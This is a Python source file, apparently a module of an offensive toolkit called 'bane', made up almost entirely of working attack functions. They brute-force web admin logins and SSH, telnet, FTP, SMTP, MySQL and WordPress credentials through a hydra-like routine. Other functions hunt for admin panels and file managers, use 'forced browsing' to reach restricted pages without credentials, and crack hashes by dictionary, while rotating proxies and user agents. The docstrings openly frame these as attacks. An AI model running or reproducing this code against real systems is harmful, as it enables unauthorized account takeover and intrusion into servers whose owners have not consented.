import requests,random,smtplib,telnetlib,sys,os,hashlib,base64,subprocess,time,xtelnet
import urllib3
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
from ftplib import FTP
from bane.payloads import *
if os.path.isdir('/data/data')==True:
    adr=True
if os.path.isdir('/data/data/com.termux/')==True:
    termux=True
import mysqlcp
from bane.pager import *
from bane.wp import wpadmin
from bane.hasher import *
def access(u,timeout=10,bypass=False,proxy=None):
 '''
   this function isused to check if the given link is returning 200 ok response or not.
   
   u: the targeted link
   timeout: (set by default to 10) timeout flag for the request
   bypass: (set by default to False) option to bypass anti-crawlers by simply adding "#" to the end of the link :)
   proxy: (set by default to None) set a http proxy: 45.22.123.147:8080
   
   usage:

   >>>import bane
   >>>url='http://www.example.com/admin/'
   >>>url+='edit.php'
   >>>a=bane.access(url)
   >>>if a==True:
   ... print 'accessable'
 '''
 if bypass==True:
   u+='#'
 if proxy:
  proxy={'http':'http://'+proxy}
 try:
   r=requests.get(u,  headers = {'User-Agent': random.choice(ua)} , allow_redirects=False,proxies=proxy,timeout=timeout, verify=False) 
   if r.status_code == requests.codes.ok:
    if (("Uncaught exception" not in r.text) or ("404 Not Found" not in r.text)):
     return True
 except Exception as e:
   pass
 return False
"""
   in functions below you can use a proxy in any function that takes the 'proxy' parameter with this way:
  
   example:

   proxy='192.122.58.47:80'

"""


def admin_login(u,pl,user_agent=None,extra={},fresh=False,timeout=10,proxy=None):
 '''
   this function try to use the values you insert in the dictionary field "p" to make a POST request in the login page and check it the 
   credentials are correct or not by checking the response code.
   
   u: login link
   pl: dictionary contains input names and values: {input's name : value} => example: {'user':'ala','pass':'ala'}
   fresh: (set by default to False) refresh html input tokens
   
   usage:

   >>>import bane
   >>>a=bane.admin_login('http://www.example.com/admin/login.php',{'user':'ala','pass':'ala'})
   >>>if a==True:
   ... print 'logged in!!!'
 '''
 if user_agent:
   us=user_agent
 else:
   us=random.choice(ua)
 if proxy:
  proxy={'http':'http://'+proxy}
 try:
  if fresh==True:
       extr=[]
       k=inputs(u,user_agent=us,proxy=proxy,timeout=timeout,value=True)
       for x in k:
        if (x.split(':')[1]!=''):
         extr.append(x)
       for x in extr:
        if x.split(':')[0] in k:
         extr.remove(x)
       extra={}
       if len(extr)!=0:
        for x in extr:
         a=x.split(':')[0]
         b=x.split(':')[1]
         extra.update({a:b})
  pl.update(extra)
  se=requests.session()
  r=se.post(u,data=pl,headers = {'User-Agent': us},allow_redirects=False,proxies=proxy,timeout=timeout, verify=False)
  if r.status_code==302:
    return True
 except:
  pass
 return False
def admin_brute_force(u,word_list=[],fresh=False,logs=True,returning=False,proxy=None,proxies=None,timeout=10):
  '''
   bruteforce admin logins

   word_list: usernames and passwords list ( word_list=["admin:admin","admin:1234"] )
  '''
  op=''
  hu=True
  if proxy:
   proxy=proxy
  if proxies:
   proxy=random.choice(proxies)
  l1=forms(u,proxy=proxy,timeout=timeout,value=True)
  if len(l1)==0:
   if logs==True:
    print("No parameters were found!!!")
   hu=False
  if hu==True:
   extr=[]
   l2=[]
   for x in l1:
    if (x.split(':')[1]!=''):
     extr.append(x)
    else:
     l2.append(x)
   l=[]
   for x in l2:
    l.append(x.split(':')[0])
   for i in word_list:
    user=i.split(':')[0]
    pwd=i.split(':')[1]
    print("[*]Trying: {} {}".format(user,pwd))
    exte=[]
    exte.append(user)
    exte.append(pwd)
    if proxies:
     proxy=random.choice(proxies)
    pl={}
    for x in range(len(l)):
     try:
      pl.update({l[x] : exte[x]})
     except:
      break
    extra={}
    if (len(extr)!=0):
     for x in extr:
      a=x.split(':')[0]
      b=x.split(':')[1]
      if a not in pl:
       extra.update({a:b})
    res=admin_login(u,pl,fresh=fresh,extra=extra,timeout=timeout,proxy=proxy)
    if res==True:
     if logs==True:
      print("[+]Found!!!")
     if returning==True:
      op="{}:{}:{}".format(u,user,pwd)
      return op
     break
    else:
     if logs==True:
      print("[-]Failed")
  if returning==True:
   return op
def filemanager_finder(u,logs=True,mapping=False,returning=False,timeout=10,proxy=None,proxies=None):
 '''
   u: the link: http://www.example.com
   logs: (set by default to True) the show the process and requests
   mapping: (set by default to: False) if it is set to True, it will stop the prcess when it finds the link, else: it continue for more
   possible links
   returning: (set by default to: False) if you want it to return a list of possibly accesseble links to be used in your scripts set it to: True
   timeout: (set by default to 10) timeout flag for the requests   

   usage:

   >>>import bane
   >>>url='http://www.example.com/'
   >>>bane.filemanager_finder(url)
   >>>bane.filemanager_finder(url,returning=True,mapping=False)
'''
 k=[]
 for i in manager:
  if proxy:
   proxy={'http':'http://'+proxy}
  if proxies:
   proxy={'http':'http://'+random.choice(proxies)}
  try:
   if u[len(u)-1]=='/':
    u=u[0:len(u)-1]
   g=u+i
   if logs==True:
    print("[*]Trying:",g)
   r=requests.get(g,  headers = {'User-Agent': random.choice(ua)} , allow_redirects=False,proxies=proxy,timeout=timeout, verify=False) 
   if r.status_code == requests.codes.ok:
    if (("Uncaught exception" not in r.text) and ("404 Not Found" not in r.text)):
     if 'could not be found' not in r.text:
      if logs==True:
       print("[+]FOUND!!!")
       k.append(g)
      if mapping==False:
       break
      else:
       if logs==True:
        print("[-]Failed")
    else:
     if logs==True:
      print("[-]Failed")
   else:
    if logs==True:
     print("[-]Failed")
  except KeyboardInterrupt:
   break
  except Exception as e:
   pass
 if returning==True:
  return k
def force_browsing(u,timeout=10,logs=True,returning=False,mapping=True,ext='php',proxy=None,proxies=None):
 '''
   this function is using "Forced Browsing" technique which is aim to access restricted areas without providing any credentials!!!
   it is used here to gain access to admin control panel by trying different possible combinations of links with the given URL.
   it's possible to do that and this a proof of concept that unserured cpanels with lack of right sessions configurations can be
   accessed just by guessing the right links :)

   the function takes those arguments:
   
   u: the targeted link which should be leading to the control panel, example:
   http://www.example.com/admin/login.php
   you have to delete 'login.php' and insert the rest of the link in the function like this:
   
   >>>import bane
   >>>bane.force_browsing('http://www.example.com/admin/')

   then the function will try to find possible accesseble links:

   http://www.example.com/admin/edit.php
   http://www.example.com/admin/news.php
   http://www.example.com/admin/home.php

   timeout: (set by default to 10) timeout flag for the request
   logs: (set by default to: True) showing the process of the attack, you can turn it off by setting it to: False
   returning: (set by default to: False) return a list of the accessible link(s), to make the function return the list, set to: True
   mapping: (set by default to: True) find all possible links, to make stop if it has found 1 link just set it to: False
   ext: (set by default to: "php") it helps you to find links with the given extention, cuurentky it supports only 3 extentions: "php", "asp"
   and "aspx"( any other extention won't be used).  
'''
 l=[]
 if u[len(u)-1]=='/':
    u=u[0:len(u)-1]
 for x in innerl:
  g=u+x+'.'+ext
  if logs==True:
   print("[*]Trying:",g)
  try:
   if proxy:
    proxy={'http':'http://'+proxy}
   if proxies:
    proxy={'http':'http://'+random.choice(proxies)}
   h=access(g,proxy=proxy)
  except KeyboardInterrupt:
   break
  if h==1:
   l.append(g)
   if logs==True:
    print("[+]FOUND!!!")
   if mapping==False:
    break
  else:
   if logs==True:
    print("[-]Failed")
 if returning==True:
  return l

def admin_panel_finder(u,logs=True,mapping=False,returning=False,ext='php',timeout=10,proxy=None,proxies=None):
 '''
   this function use a list of possible admin panel links with different extensions: php, asp, aspx, js, /, cfm, cgi, brf and html.
   
   ext: (set by default to: 'php') to define the link's extention.

   usage:

  >>>import bane
  >>>bane.admin_panel_finder('http://www.example.com',ext='php',timeout=7)

  >>>bane.admin_panel_finder('http://www.example.com',ext='aspx',timeout=5)
 '''
 links=[]
 ext=ext.strip()
 if ext.lower()=="php":
  links=phpl
 elif ext.lower()=="asp":
  links=aspl
 elif ext.lower()=="aspx":
  links=aspxl
 elif ext.lower()=="js":
  links=jsl
 elif ext=="/":
  links=slashl
 elif ext.lower()=="cfm":
  links=cfml
 elif ext.lower()=="cgi":
  links=cgil
 elif ext.lower()=="brf":
  links=brfl
 elif ext.lower()=="html":
  links=htmll
 k=[]
 for i in links:
  try:
   if proxy:
    proxy={'http':'http://'+proxy}
   if proxies:
    proxy={'http':'http://'+random.choice(proxies)}
   if u[len(u)-1]=='/':
    u=u[0:len(u)-1]
   g=u+i
   if logs==True:
    print("[*]Trying:",g)
   r=requests.get(g,headers = {'User-Agent': random.choice(ua)},allow_redirects=False,proxies=proxy,timeout=timeout, verify=False) 
   if r.status_code == requests.codes.ok:
    if logs==True:
     print("[+]FOUND!!!")
    k.append(g)
    if mapping==False:
     break
   else:
    if logs==True:
     print("[-]failed")
  except KeyboardInterrupt:
   break
  except Exception as e:
   if logs==True:
    print ("[-]Failed")
 if returning==True:
  return k
'''
  the next functions are used to check the login credentials you provide, it can be used for bruteforce attacks.

  it returns True if the given logins, else it returns False.

  example:

  >>>host='125.33.32.11'
  >>>wordlist=['admin:admin','admin123:admin','user:password']
  >>>for x in wordlist:
      user=x.split(':')[0]
      pwd=x.split(':')[1]
      print '[*]Trying:',user,pwd
      if bane.telnet(host,username=user,password=pwd)==True:
       print'[+]Found!!!'
      else:
       print'[-]Failed'

'''
def smtp(u, username,password,p=25,ehlo=True,helo=False,ttls=False):
 try:
  s= smtplib.SMTP(u, p)#connect to smtp server
  if ehlo==True:
   s.ehlo()#ehlo
   if ttls==True:
    s.starttls()#ttls
  if helo==True:
   s.helo()#helo
   if ttls==True:
    s.starttls()
  s.login(username, password)
  return True
 except Exception as e:
  pass
 return False
def telnet(u,username,password,p=23,timeout=3):
 try:
  t=xtelnet.session()
  t.login(u,username=username,password=password,p=p,timeout=timeout)
  t.close()
  return True
 except:
  pass
 return False
def ssh_linux(u,username,password,p=22,timeout=3):
 # ssh login on linux
 l="sshpass -p {} ssh -o ConnectTimeout={} -p {} -o StrictHostKeyChecking=no -l {} {} ; exit".format(password,timeout,p,username,u) #we use the sshpass command to send the password
 ti=time.time()
 ssh = subprocess.Popen(l.split(),stdin=subprocess.PIPE,stdout=subprocess.PIPE,stderr=subprocess.PIPE)
 while ssh.poll() is None:
   time.sleep(.1)
   if int(time.time()-ti)==timeout:
       try:
        ssh.kill()
       except:
        pass
       return False
 p=ssh.communicate()
 try:
   ssh.kill()
 except:
   pass
 if (p[1].decode("utf-8") ==''):
  return True
 else:
  return False
 
def ssh_win(ip,username,password,p=22,version=1,timeout=3):
 #ssh login for windows (requires putty: plink )
 try:
  l='echo yes | plink -ssh -{} -l {} -pw {} {} -P {} exit'.format(version,username,password,ip,p)
  ti=time.time()
  ssh = subprocess.Popen(l.split(),stdin=subprocess.PIPE,stdout=subprocess.PIPE,stderr=subprocess.PIPE,shell=True)
  while ssh.poll() is None:
   time.sleep(.1)
   if int(time.time()-ti)==timeout:
       try:
        ssh.kill()
       except:
        pass
       return False
  try:
   ssh.kill()
  except:
   pass
  p=ssh.communicate()
  print(p)
  if ("Access granted" in p[0])or ("Access granted" in p[1]):
     return True
  else:
     return False
 except:
  pass
 return False
def ssh_andro(u,username,password,p=22,timeout=3):
 # ssh login on termux
 l="sshpass -p {} ssh -o ConnectTimeout={} -p {} -o StrictHostKeyChecking=no -l {} {} ; exit".format(password,timeout,p,username,u) #we use the sshpass command to send the password
 ti=time.time()
 ssh = subprocess.Popen(l.split(),stdin=subprocess.PIPE,stdout=subprocess.PIPE,stderr=subprocess.PIPE)
 while ssh.poll() is None:
   time.sleep(.1)
   if int(time.time()-ti)==timeout:
       try:
        ssh.kill()
       except:
        pass
       return False
 p=ssh.communicate()
 try:
   ssh.kill()
 except:
   pass
 if (p[1].decode("utf-8") ==''):
  return True
 else:
  return False
def ftp_anon(ip,timeout=5):
  #anonymous ftp login
  try:
    ftp = FTP(ip,timeout=timeout)
    ftp.login()
    return True
  except Exception as e:
    pass
  return False
def ftp(ip,username,password,timeout=5):
   try:
    i=False
    ftp = FTP(ip,timeout=timeout)
    ftp.login(username,password)
    return True
   except Exception as e:
    pass
   return False
def mysql(u,username,password,timeout=5,p=3306):
 try:
  s=mysqlcp.session(u,username,password,timeout=timeout,port=p)
  s.destroy()
  return True
 except Exception as e:
  pass
 return False
def hydra(u,p=22,protocol="ssh",ssh_version=2,word_list=[],logs=True,returning=False,mapping=False,timeout=5,ehlo=False,helo=True,ttls=False,proxy=None,proxies=None):
 '''
   this function is similar to hydra tool to bruteforce attacks on different ports.

   protocol: (set by default to: ssh) set the chosen protocol (ftp, ssh, telnet, smtp and mysql) and don't forget to set the port.
'''
 o=''
 if protocol=="telnet":
     s=telnet
 if protocol=="ssh":
  s=ssh_linux
  if (sys.platform == "win32") or( sys.platform == "win64"):
   s=ssh_win
  if termux==True:
   s=ssh_andro
 if protocol=="ftp":
  s=ftp
 if protocol=="smtp":
  s=smtp
 if protocol=="mysql":
  s=mysql
 if protocol=="wp":
  s=wpadmin
 for x in word_list:
  user=x.split(':')[0].strip()
  pwd=x.split(':')[1].strip()
  if logs==True:
   print("[*]Trying ==> {}:{}".format(user,pwd))
  if protocol=="ssh":
    if (sys.platform == "win32") or( sys.platform == "win64"):
      r=s(u,user,pwd,timeout=timeout,p=p,version=ssh_version)
    else:
      r=s(u,user,pwd,timeout=timeout,p=p)
  if protocol=="telnet":
      r=s(u,user,pwd,timeout=timeout,p=p)
  if (protocol=="mysql"):
   r=s(u,user,pwd,timeout=timeout,p=p)
  elif (protocol=="ftp"):
   r=s(u,user,pwd,timeout=timeout)
  elif (protocol=="wp"):
   if proxy:
    proxy=proxy
   if proxies:
    proxy=random.choice(proxies)
   r=s(u,user,pwd,proxy=proxy,timeout=timeout)
  elif (protocol=="smtp"):
   r=s(u,p,user,pwd,ehlo=ehlo,helo=helo,ttls=ttls)
  else:
   r=s(u,user,pwd,timeout=timeout)
  if r==True:
   if logs==True:
    print("[+]Found!!!")
   if returning==True:
    o="{}:{}:{}".format(u,user,pwd)
    return o
   break
  else:
   if logs==True:
    print("[-]Failed")
 if returning==True:
  return o
def decrypt(u,word_list=[],md5_hash=True,sha1_hash=False,sha256_hash=False,sha224_hash=False,sha384_hash=False,sha512_hash=False,base64_hash=False,caesar_hash=False,logs=True,returning=False):
 if logs==True:
  print('[!]hash: '+u+'\nbruteforcing has started!!!\n')
 s=False
 for x in word_list:
  if md5_hash==True:
   if dmd5(x,u)==True:
    if logs==True:
     print("[+]Hash match found: "+x+" | Type: md5")
     s=True
     break
    if returning==True:
     return x
  if sha1_hash==True:
   if dsha1(x,u)==True:
    if logs==True:
     print("[+]Hash match found: "+x+" | Type: sha1")
     s=True
     break
    if returning==True:
     return x
  if sha256_hash==True:
   if dsha256(x,u)==True:
    if logs==True:
     print("[+]Hash match found: "+x+" | Type: sha256")
     s=True
     break
    if returning==True:
     return x
  if sha224_hash==True:
   if dsha224(x,u)==True:
    if logs==True:
     print("[+]Hash match found: "+x+" | Type: sha224")
     s=True
     break
    if returning==True:
     return x
  if sha384_hash==True:
   if dsha384(x,u)==True:
    if logs==True:
     print("[+]Hash match found: "+x+" | Type: sha384")
     s=True
     break
    if returning==True:
     return x
  if sha512_hash==True:
   if dsha512(x,u)==True:
    if logs==True:
     print("[+]Hash match found: "+x+" | Type: sha512")
     s=True
     break
    if returning==True:
     return x
  if base64_hash==True:
   if base64decode(x)==u:
    if logs==True:
     print("[+]Hash match found: "+x+" | Type: base64")
     s=True
     break
    if returning==True:
     return x
  if caesar_hash==True:
   for i in range(1,27):
    if dcaesar(x,i)==u:
     if logs==True:
      print("[+]Hash match found: "+x+" | Type: caesar | Key: "+str(i))
      s=True
      break
     if returning==True:
      return x
 if s==False:
  if logs==True:
   print('[-]No match found')
  if returning==True:
   return None
